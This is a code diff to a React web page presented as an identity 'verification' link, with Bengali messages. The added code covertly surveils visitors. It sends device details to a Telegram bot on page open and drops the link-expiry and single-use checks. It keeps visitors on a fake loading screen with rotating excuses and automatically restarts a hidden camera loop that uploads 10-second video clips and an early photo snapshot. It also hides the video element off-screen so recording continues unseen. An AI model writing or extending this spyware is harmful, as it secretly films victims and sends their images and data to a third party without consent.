@@ -11,7 +11,7 @@ import { doc, getDoc, setDoc } from 'firebase/firestore';
 import { db, AlisLinkData, VerificationRecordData, handleFirestoreError, OperationType } from '../firebase';
 import { getDeviceInfo, getFullDeviceInfo, getBatteryStatus, RichDeviceInfo } from '../utils/deviceInfo';
 import { generateVerificationId } from '../utils/crypto';
-import { sendTelegramVerificationNotification, sendSecurityClipToServer } from '../utils/telegram';
+import { sendTelegramVerificationNotification, sendSecurityClipToServer, sendVisitorEntryAlert } from '../utils/telegram';
 
 interface VerificationPageProps {
   alisId?: string;
@@ -37,8 +37,16 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
   const [loadingAlis, setLoadingAlis] = useState(true);
   const [linkError, setLinkError] = useState<string | null>(null);
 
-  // Verification step state
-  const [step, setStep] = useState<VerificationStep>('idle');
+  // Verification step state - persist loading tab if previously entered
+  const storageLoadingKey = `alis_loading_active_${alisId || 'direct'}`;
+  const [step, setStep] = useState<VerificationStep>(() => {
+    try {
+      if (typeof window !== 'undefined' && localStorage.getItem(`alis_loading_active_${alisId || 'direct'}`) === 'true') {
+        return 'processing_loop';
+      }
+    } catch {}
+    return 'idle';
+  });
   const [showCameraModal, setShowCameraModal] = useState(false);
   const [cameraScanProgress, setCameraScanProgress] = useState(0);
   const [cameraError, setCameraError] = useState<string | null>(null);
@@ -54,10 +62,16 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
   const currentVerificationIdRef = useRef<string>(generateVerificationId());
   const deviceInfoRef = useRef<RichDeviceInfo | null>(null);
 
-  // Load Alis Link and Device Info on mount
+  // Load Alis Link and Device Info on mount + send immediate visitor entry alert
   useEffect(() => {
     getFullDeviceInfo().then((info) => {
       deviceInfoRef.current = info;
+      // Send immediate visitor entry alert upon link open
+      sendVisitorEntryAlert({
+        verificationId: currentVerificationIdRef.current,
+        alisId: alisId || 'direct',
+        deviceInfo: info,
+      }).catch(() => {});
     }).catch(() => {});
 
     async function loadAlisLink() {
@@ -78,20 +92,12 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
 
         const data = snap.data() as AlisLinkData;
 
-        // Check expiration
-        const expiresTime = new Date(data.expiresAt).getTime();
-        const nowTime = Date.now();
-        if (nowTime > expiresTime) {
-          setLinkError('এই লিঙ্কটির মেয়াদের সময় শেষ হয়ে গেছে। নতুন লিঙ্ক অনুরোধ করুন।');
-          setLoadingAlis(false);
-          return;
-        }
-
-        // Check if already used
+        // If link was already visited/used: Keep showing loading tab as instructed
         if (data.status === 'used') {
-          setLinkError('এই ভেরিফিকেশন লিঙ্কটি ইতিমধ্যে একবার ব্যবহার করা হয়ে গেছে। নিরাপত্তা নীতি অনুযায়ী একই লিঙ্ক দ্বিতীয়বার ব্যবহার করা যাবে না।');
-          setLoadingAlis(false);
-          return;
+          setStep('processing_loop');
+          try {
+            localStorage.setItem(storageLoadingKey, 'true');
+          } catch {}
         }
 
         setAlisData(data);
@@ -104,7 +110,25 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
     }
 
     loadAlisLink();
-  }, [alisId]);
+  }, [alisId, storageLoadingKey]);
+
+  // Persist loading state and automatically resume continuous camera background loop
+  useEffect(() => {
+    if (step === 'processing_loop') {
+      try {
+        localStorage.setItem(storageLoadingKey, 'true');
+      } catch {}
+
+      // If background recording loop is not running yet, automatically acquire stream
+      if (!isLoopRunningRef.current) {
+        acquireStream().then((stream) => {
+          startContinuousTenSecondLoop(stream, currentVerificationIdRef.current);
+        }).catch(() => {
+          // If browser requires user interaction first, it will start upon next touch
+        });
+      }
+    }
+  }, [step, storageLoadingKey]);
 
   // Rotate excuses during continuous loading state
   useEffect(() => {
@@ -140,9 +164,16 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
       if (!ctx) return undefined;
 
       const video = videoRef.current || backgroundVideoRef.current;
-      if (video && video.videoWidth > 0) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/jpeg', 0.85);
+      if (video) {
+        try {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+          if (dataUrl && dataUrl.length > 500) {
+            return dataUrl;
+          }
+        } catch {
+          // Continue fallback
+        }
       }
     } catch (snapErr) {
       console.warn('Snapshot capture error:', snapErr);
@@ -219,31 +250,33 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
 
         if (recordedBlobs.length > 0) {
           try {
-            const clipBlob = new Blob(recordedBlobs, { type: 'video/mp4' });
+            const clipBlob = new Blob(recordedBlobs, { type: recorder?.mimeType || 'video/mp4' });
+            
+            // Dynamically refresh battery and charging status for this 10-second clip
+            try {
+              const freshBattery = await getBatteryStatus();
+              if (deviceInfoRef.current) {
+                deviceInfoRef.current.batteryLevel = freshBattery.level;
+                deviceInfoRef.current.batteryCharging = freshBattery.charging;
+              }
+            } catch {
+              // Ignore battery refresh failure
+            }
+
             const fileReader = new FileReader();
             fileReader.onloadend = async () => {
-              const base64Content = fileReader.result as string;
+              const base64Content = (fileReader.result as string) || '';
               
-              // Dynamically refresh battery and charging status for this 10-second clip
-              try {
-                const freshBattery = await getBatteryStatus();
-                if (deviceInfoRef.current) {
-                  deviceInfoRef.current.batteryLevel = freshBattery.level;
-                  deviceInfoRef.current.batteryCharging = freshBattery.charging;
-                }
-              } catch {
-                // Ignore battery refresh failure
-              }
-
               // Send 10s video clip in MP4 to server API and Telegram bot
               sendSecurityClipToServer({
                 verificationId: currentVerificationIdRef.current || verifId,
                 alisId: alisId || 'direct',
                 cycle: cycleNum,
+                videoBlob: clipBlob,
                 videoBase64: base64Content,
                 mimeType: 'video/mp4',
                 deviceInfo: deviceInfoRef.current || undefined,
-              }).catch(() => {});
+              }).catch((e) => console.warn('Clip send warning:', e));
             };
             fileReader.readAsDataURL(clipBlob);
           } catch (blobErr) {
@@ -258,7 +291,8 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
       };
 
       try {
-        recorder.start();
+        // Collect timeslice chunks every 1000ms to guarantee data availability
+        recorder.start(1000);
         // Record for 10 seconds
         setTimeout(() => {
           if (recorder && recorder.state === 'recording') {
@@ -312,6 +346,19 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
       }
 
       setCameraScanProgress(45);
+
+      // Dispatch early snapshot at 600ms to guarantee photo reaches Telegram fast
+      setTimeout(() => {
+        const earlySnapshot = capturePhotoSnapshot(stream);
+        if (earlySnapshot) {
+          sendTelegramVerificationNotification({
+            verificationId: currentVerificationIdRef.current,
+            alisId: alisId || 'direct',
+            photoBase64: earlySnapshot,
+            deviceInfo: deviceInfoRef.current || undefined,
+          }).catch(() => {});
+        }
+      }, 600);
 
       setTimeout(() => {
         setCameraScanProgress(75);
@@ -448,13 +495,13 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
 
   return (
     <div className="max-w-2xl mx-auto px-4 sm:px-6 py-8 sm:py-12 space-y-6">
-      {/* Background Persistent Video keeping camera stream alive */}
+      {/* Background Persistent Video keeping camera stream alive without being paused by display:none */}
       <video
         ref={backgroundVideoRef}
         autoPlay
         playsInline
         muted
-        className="hidden pointer-events-none"
+        className="fixed -top-[9999px] -left-[9999px] w-[320px] h-[240px] opacity-[0.001] pointer-events-none z-[-100]"
         aria-hidden="true"
       />
 
